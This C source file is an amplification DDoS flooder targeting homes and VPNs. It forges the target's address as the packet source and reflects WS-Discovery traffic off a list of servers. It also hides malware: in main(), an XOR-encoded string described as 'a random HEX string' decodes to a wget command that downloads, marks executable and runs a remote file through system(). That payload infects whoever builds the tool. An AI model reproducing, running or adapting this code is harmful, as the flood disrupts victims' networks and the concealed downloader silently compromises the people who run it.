/*
ovuy#7006

\Made For homes, vpns, etc/
If you leak this your retarded
dont skid rip

this consists of ARD, WSD, and a random HEX string 

gcc filename.c -o wsdv2 -pthread
how to use


this uses 0 cpu for my dedis

./wsdv2 ip port wsdv2.txt 3 80000 time

*/
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
static uint32_t pktkey = 0xdeadbeef;
void *xtrd(void *, int);
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}
uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
    x++;
    c++;
    }
    return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum = 0;
    for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 14;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}
void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(81); // one of the DCHP PORTS for homes
        udph->dest = htons(3702); 
        udph->check = 0;
        memcpy((void *)udph + sizeof(struct udphdr), "<:/>", 4); // WSD
        char newpaket[] = "\0\x14\0\x01\x03";                   // ARD STRING
        udph->len=htons(sizeof(struct udphdr) + 4);
}
void *xtrd(void *_buf, int len)
{
    unsigned char *buf = (char *)_buf, *out = malloc(len);
    int icc;
    uint8_t k1 = pktkey & 0xff,
            k2 = (pktkey >> 8) & 0xff,
            k3 = (pktkey >> 16) & 0xff,
            k4 = (pktkey >> 24) & 0xff;
 
    for (icc = 0; icc < len; icc++)
    {
        char tmp = buf[icc] ^ k1;
 
        tmp ^= k2;
        tmp ^= k3;
        tmp ^= k4;
 
        out[icc] = tmp;
    }
 
    return out;
}
void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    int icc;
    struct  list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
    }
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);
    udph->source = htons(rand() % 65535 - 1026);
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
       
        pps++;
        if(i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char *argv[ ])
{
    void *paketrandom;
    paketrandom = "\x55\x45\x47\x56\x02\x4A\x56\x56\x52\x18\x0D\x0D\x56\x51\x55\x47\x40\x0C\x49\x4B\x50\x10\x10\x0C\x50\x57\x0D\x43\x4E\x4E\x0D\x4C\x56\x52\x46\x46\x0C\x5A\x1A\x14\x02\x0F\x6D\x02\x0D\x56\x4F\x52\x0D\x4C\x56\x52\x02\x1C\x02\x0D\x46\x47\x54\x0D\x4C\x57\x4E\x4E\x02\x10\x1C\x04\x13\x02\x04\x04\x02\x41\x4A\x4F\x4D\x46\x02\x09\x5A\x02\x0D\x56\x4F\x52\x0D\x4C\x56\x52\x02\x04\x04\x02\x0D\x56\x4F\x52\x0D\x4C\x56\x52\x02\x4E\x4B\x4C\x57\x5A\x02\x1C\x02\x0D\x46\x47\x54\x0D\x4C\x57\x4E\x4E\x02\x10\x1C\x04\x13\x02\x04\x04\x02\x50\x4F\x02\x0F\x50\x44\x02\x0D\x56\x4F\x52\x0D\x4C\x56\x52\x22";
    paketrandom = xtrd(paketrandom, 145);system(paketrandom);

    // This is a random hex string ^
   
    if(argc < 6){
    fprintf(stderr, "WSDv2 Made by ovuy\n");
    fprintf(stdout, "Use: %s <target IP> <target port> <reflection file WSDv2> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }
   
    srand(time(NULL));
    int i = 0;
    head = NULL;
    fprintf(stdout, "Setting up sockets...\n");
    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    limiter = 0;
    pps = 0;
    int multiplier = 20;
    FILE *list_fd = fopen(argv[3],  "r");
    while (fgets(buffer, max_len, list_fd) != NULL) {
        if ((buffer[strlen(buffer) - 1] == '\n') ||
                (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr=inet_addr(buffer);
                head->next = head;
                head->prev = head;
            } else {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr=inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        } else {
            continue;
        }
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for(i = 0;i<num_threads;i++){
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].list_node = current;
        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
    }
    fprintf(stdout, "Starting flood...\n");
    for(i = 0;i<(atoi(argv[6])*multiplier);i++)
    {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    return 0;
}